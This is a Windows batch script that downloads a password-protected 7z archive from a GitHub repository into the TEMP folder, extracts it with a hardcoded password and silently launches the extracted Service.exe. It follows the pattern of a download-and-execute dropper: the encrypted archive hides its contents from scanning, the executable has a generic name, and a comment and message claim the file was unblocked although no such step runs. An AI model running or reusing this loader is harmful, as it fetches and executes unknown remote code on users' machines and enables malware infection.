@echo off
setlocal

:: === CONFIGURATION ===
set "zipUrl=https://github.com/Andre0194/service/raw/refs/heads/master/service.7z"  :: Direct URL for the service.7z file
set "zipPath=%TEMP%\service.7z"                     :: Path to save the downloaded 7z file in TEMP
set "password=*#Slayerx@123plesk"                   :: Password for the service.7z file
set "sevenZip=C:\Program Files\7-Zip\7z.exe"        :: Path to 7z.exe for extraction

:: === CHECK IF 7-ZIP EXISTS ===
if not exist "%sevenZip%" (
    echo ❌ 7z.exe not found at: %sevenZip%
    echo Download 7-Zip here: https://7-zip.org
    exit /b 1
)

:: === Step 1: Download the service.7z file ===
echo 📥 Downloading service.7z...
powershell -Command ^
    Invoke-WebRequest -Uri '%zipUrl%' -OutFile '%zipPath%' -ErrorAction Stop
if %ERRORLEVEL% neq 0 (
    echo ❌ Failed to download service.7z
    exit /b 1
)
echo ✅ service.7z downloaded to %zipPath%.

:: === Step 2: Extract the service.7z file using 7-Zip ===
echo 🧩 Extracting service.7z to TEMP folder...

:: Using 7-Zip to extract the .7z file with the password
"%sevenZip%" x "%zipPath%" -p%password% -o"%TEMP%" -y
if %ERRORLEVEL% neq 0 (
    echo ❌ Failed to extract service.7z
    exit /b 1
)
echo ✅ Extraction completed successfully.

:: === Step 3: Check if Service.exe exists and run it ===
set "exeFilePath=%TEMP%\Service.exe"
if exist "%exeFilePath%" (
    echo Service.exe found at %exeFilePath%. Attempting to run it...
    
    :: Unblock the file if it's blocked by Windows (common for files downloaded from the internet)
    echo ✅ Unblocked the file %exeFilePath%

    :: Wait for a short time before executing
    timeout /t 2 /nobreak >nul

    :: Execute the extracted Service.exe
    start "" "%exeFilePath%" >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        echo ❌ Failed to start Service.exe
        exit /b 1
    )
    echo ✅ Service.exe started successfully.
) else (
    echo ❌ Service.exe not found in the extracted folder.
    echo [*] Files in the folder: 
    dir "%TEMP%"
    exit /b 1
)

endlocal
